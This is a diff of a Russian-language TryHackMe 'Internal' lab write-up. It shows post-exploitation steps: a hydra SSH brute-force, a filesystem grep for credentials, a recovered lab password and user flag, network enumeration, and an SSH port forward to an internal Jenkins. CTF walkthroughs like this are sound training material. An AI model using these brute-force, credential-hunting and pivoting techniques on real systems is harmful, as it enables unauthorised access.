@@ -190,6 +190,9 @@ admin@internal.thm
 Перехожу в несуществующий пост и получаю доступ    
 ![reverse](screenshots/03.reverse.png)
 
+
+## ⚙️ Привилегии
+
 Из пользователей есть **aubreanna**
 ```
 $ cd home
@@ -200,8 +203,108 @@ drwxr-xr-x 24 root      root      4096 Aug  3  2020 ..
 drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
 ```
 
+Информация о системе
+```
+$ cat /proc/version
+Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
 
-## ⚙️ Привилегии
+$ cat /etc/issue
+Ubuntu 18.04.4 LTS \n \l
+```
+
+brute ssh не дал результатов
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
+└─$ hydra -l aubreanna -P /media/sf_Exchange/Dictionaries/rockyou.txt -t 40 ssh://internal.thm
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway)
+```
+
+Пробую поискать файлы с кредами
+```
+$ grep -Ril "password\|aubreanna" / 2>/dev/null
+/opt/wp-save.txt
+/proc/kallsyms
+```
+
+Захожу под **aubreanna** **bubb13guM!@#123**
+```
+aubreanna@internal:~$ ls -la
+total 56
+drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
+drwxr-xr-x 3 root      root      4096 Aug  3  2020 ..
+-rwx------ 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
+-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
+-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
+drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
+drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
+drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .local
+-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
+-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
+drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
+-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
+-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
+drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
+-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
+aubreanna@internal:~$ cat user.txt
+THM{int3rna1_fl4g_1}
+```
+
+Там же в директории есть файл **jenkins.txt**
+```
+aubreanna@internal:~$ cat jenkins.txt 
+Internal Jenkins service is running on 172.17.0.2:8080
+```
+
+Осматриваюсь по сетевым интерфейсам
+```
+aubreanna@internal:~$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
+    link/ether 02:af:fa:5c:b1:81 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.123.74/16 brd 10.10.255.255 scope global dynamic eth0
+       valid_lft 2442sec preferred_lft 2442sec
+    inet6 fe80::af:faff:fe5c:b181/64 scope link 
+       valid_lft forever preferred_lft forever
+3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:15:c8:36:eb brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:15ff:fec8:36eb/64 scope link 
+       valid_lft forever preferred_lft forever
+5: veth21870e3@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
+    link/ether 16:92:9f:dd:c8:8f brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::1492:9fff:fedd:c88f/64 scope link 
+       valid_lft forever preferred_lft forever
+aubreanna@internal:~$ ss -tunlp
+Netid     State        Recv-Q       Send-Q                  Local Address:Port              Peer Address:Port      
+udp       UNCONN       0            0                       127.0.0.53%lo:53                     0.0.0.0:*         
+udp       UNCONN       0            0                   10.10.123.74%eth0:68                     0.0.0.0:*         
+tcp       LISTEN       0            80                          127.0.0.1:3306                   0.0.0.0:*         
+tcp       LISTEN       0            128                         127.0.0.1:37423                  0.0.0.0:*         
+tcp       LISTEN       0            128                         127.0.0.1:8080                   0.0.0.0:*         
+tcp       LISTEN       0            128                     127.0.0.53%lo:53                     0.0.0.0:*         
+tcp       LISTEN       0            128                           0.0.0.0:22                     0.0.0.0:*         
+tcp       LISTEN       0            128                                 *:80                           *:*         
+tcp       LISTEN       0            128                              [::]:22                        [::]:*
+```
+
+Пробрасываю **8080** на **9999**, т.к. 8080 у меня занят
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
+└─$ ssh -f -N -L 9999:localhost:8080 aubreanna@internal.thm
+aubreanna@internal.thm's password: 
+```
+
+Там встречает Jenkins
+![jenkins](screenshots/04.jenkins.png)
+
+
+
 
 
 
